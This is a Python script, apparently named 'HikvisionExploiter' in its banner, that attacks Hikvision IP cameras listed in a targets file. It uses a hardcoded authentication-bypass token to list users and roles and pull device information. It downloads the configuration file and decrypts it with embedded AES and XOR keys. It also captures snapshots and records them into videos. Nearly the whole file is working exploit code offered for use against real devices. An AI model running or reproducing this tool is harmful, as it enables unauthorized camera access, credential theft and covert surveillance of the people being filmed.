import requests
import os
import time
from datetime import datetime, timedelta
import subprocess
import signal
from concurrent.futures import ThreadPoolExecutor
import xml.etree.ElementTree as ET
from itertools import cycle
from Crypto.Cipher import AES
import re

# Directory path to check
directory_path = "/onvif-http/snapshot?auth=YWRtaW46MTEK"

# Paths for additional information
device_info_path = "/System/deviceInfo?auth=YWRtaW46MTEK"
user_info_path = "/Security/users?auth=YWRtaW46MTEK"
config_file_path = "/System/configurationFile?auth=YWRtaW46MTEK"  # Ensure this is defined

# Create directories to save snapshots and videos
os.makedirs("snapshots", exist_ok=True)
os.makedirs("records", exist_ok=True)

# ANSI color codes
class Color:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"

# Global flag to handle interrupt
interrupted = False

# Function to print the banner
def print_banner():
    banner = f"""
{Color.GREEN}
============================================================
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

Contact me on:
Instagram : @hex_buddy
Telegram : @HexBuddy127001
============================================================
{Color.RESET}
"""
    print(banner)

# Function to read targets from targets.txt
def read_targets(file_path):
    try:
        with open(file_path, 'r') as file:
            targets = [line.strip() for line in file if line.strip()]
        return targets
    except FileNotFoundError:
        print(f"{Color.RED}[-] Error: {file_path} not found!{Color.RESET}")
        return []

# Function to check if a directory is accessible
def check_directory(ip_port):
    url = f"http://{ip_port}{directory_path}"
    try:
        response = requests.head(url, timeout=10)
        if response.status_code == 200:  # Fix: Removed the extra parenthesis here
            print(f"{Color.GREEN}[+] Directory is accessible: {url}{Color.RESET}")
            return url
    except Exception as e:
        print(f"{Color.RED}[-] Error checking directory: {e} ({url}){Color.RESET}")
    return None

# Function to fetch and parse XML data
def fetch_xml_data(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return ET.fromstring(response.content)
        else:
            print(f"{Color.YELLOW}[-] Failed to retrieve XML data from {url}{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Error fetching XML data: {e} ({url}){Color.RESET}")
    return None

# Function to print device information
def print_device_info(ip_port):
    url = f"http://{ip_port}{device_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        print(f"{Color.BLUE}[+] Device information for {ip_port}:{Color.RESET}")
        for child in xml_data:
            print(f"{Color.GREEN}{child.tag.split('}')[-1].replace('device', 'Device ')}: {child.text}{Color.RESET}")

# Function to print user information
def print_user_info(ip_port):
    url = f"http://{ip_port}{user_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        print(f"{Color.BLUE}[+] Users and roles for {ip_port}:{Color.RESET}")
        for user in xml_data:
            username_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userName')
            user_level_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userLevel')

            if username_element is not None and user_level_element is not None:
                username = username_element.text
                user_level = user_level_element.text
                print(f"{Color.GREEN}{username}: {user_level}{Color.RESET}")
            else:
                print(f"{Color.YELLOW}[-] User or user level information not found for {ip_port}{Color.RESET}")

# Function to download a single snapshot
def download_single_snapshot(url, folder):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            filename = os.path.join(folder, "0000.jpg")
            with open(filename, 'wb') as f:
                f.write(response.content)
            print(f"{Color.BLUE}[+] Snapshot saved: {filename}{Color.RESET}")
        else:
            print(f"{Color.YELLOW}[-] Failed to download snapshot from {url}{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Error downloading snapshot: {e} ({url}){Color.RESET}")

# Function to download snapshots continuously
def download_snapshots_continuous(url, folder):
    counter = 0
    start_time = datetime.now()
    duration = timedelta(minutes=2)  # Change duration as needed
    while datetime.now() - start_time < duration:
        if interrupted:
            print(f"{Color.YELLOW}[!] Continuous snapshot download interrupted.{Color.RESET}")
            break
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                filename = os.path.join(folder, f"{counter:04d}.jpg")
                with open(filename, 'wb') as f:
                    f.write(response.content)
                print(f"{Color.BLUE}[+] Snapshot saved: {filename}{Color.RESET}")
                counter += 1
            else:
                print(f"{Color.YELLOW}[-] Failed to download snapshot from {url}{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}[-] Error downloading snapshot: {e} ({url}){Color.RESET}")
        time.sleep(5)

# Function to create video from snapshots
def create_video(folder, video_folder):
    folder_name = os.path.basename(folder)
    input_pattern = os.path.join(folder, "%04d.jpg")
    output_file = os.path.join(video_folder, f"{folder_name}.mp4")

    ffmpeg_command = [
        'ffmpeg', '-y', '-framerate', '2', '-i', input_pattern,
        '-c:v', 'libx264', '-r', '30', '-pix_fmt', 'yuv420p', output_file
    ]

    try:
        subprocess.run(ffmpeg_command, check=True)
        print(f"{Color.GREEN}[+] Video created: {output_file}{Color.RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{Color.RED}[-] Error creating video: {e}{Color.RESET}")

# Function to handle SIGINT (Ctrl+C)
def handle_sigint(signum, frame):
    global interrupted
    interrupted = True
    print(f"\n{Color.YELLOW}[!] Script interrupted. Exiting...{Color.RESET}")

# Function to pad the ciphertext for AES
def add_to_16(value):
    while len(value) % 16 != 0:
        value += b'\0'
    return value

# Functions to decrypt the configuration file
def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
    key = bytes.fromhex(hex_key)
    ciphertext = add_to_16(ciphertext)
    cipher = AES.new(key, AES.MODE_ECB)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

# Function to fetch and decrypt configuration file
def fetch_and_decrypt_config(ip_port, folder):
    url = f"http://{ip_port}{config_file_path}"  # Ensure config_file_path is accessible here
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            decrypted_data = xore(decrypt(response.content))
            # Convert binary decrypted data to text assuming it's UTF-8 encoded
            try:
                decrypted_text = decrypted_data.decode('utf-8')
            except UnicodeDecodeError:
                print(f"{Color.YELLOW}[-] Decrypted data is not valid UTF-8 text.{Color.RESET}")
                decrypted_text = decrypted_data.decode('latin-1')  # Fallback encoding

            config_file = os.path.join(folder, "decrypted_configfile.txt")
            with open(config_file, 'w') as f:
                f.write(decrypted_text)
            print(f"{Color.BLUE}[+] Decrypted configuration file saved to: {config_file}{Color.RESET}")
        else:
            print(f"{Color.YELLOW}[-] Failed to retrieve configuration file from {url}{Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Error fetching configuration file: {e} ({url}){Color.RESET}")

# Main function
def main():
    print_banner()
    signal.signal(signal.SIGINT, handle_sigint)
    
    targets = read_targets("targets.txt")
    with ThreadPoolExecutor(max_workers=4) as executor:
        for target in targets:
            ip_port = target.split(",")[0]
            snapshot_url = check_directory(ip_port)
            if snapshot_url:
                folder = os.path.join("snapshots", ip_port.replace(":", "_"))
                os.makedirs(folder, exist_ok=True)
                
                print_user_info(ip_port)
                print_device_info(ip_port)
                fetch_and_decrypt_config(ip_port, folder)
                
                # Download a single snapshot
                executor.submit(download_single_snapshot, snapshot_url, folder)
    
    # Wait for all threads to complete
    executor.shutdown(wait=True)
    
    # Ask the user if they want to create recorded videos
    user_input = input(f"{Color.YELLOW}Do you want to start taking continuous snapshots for creating recorded videos from the cameras? (yes/no): {Color.RESET}")
    if user_input.strip().lower() == "yes":
        with ThreadPoolExecutor(max_workers=4) as executor:
            for target in targets:
                ip_port = target.split(",")[0]
                snapshot_url = check_directory(ip_port)
                if snapshot_url:
                    folder = os.path.join("snapshots", ip_port.replace(":", "_"))
                    executor.submit(download_snapshots_continuous, snapshot_url, folder)
        
        # Wait for all threads to complete
        executor.shutdown(wait=True)
        
        # Create recorded videos from the snapshots
        for folder in os.listdir("snapshots"):
            folder_path = os.path.join("snapshots", folder)
            if os.path.isdir(folder_path):
                create_video(folder_path, "records")

if __name__ == "__main__":
    main()
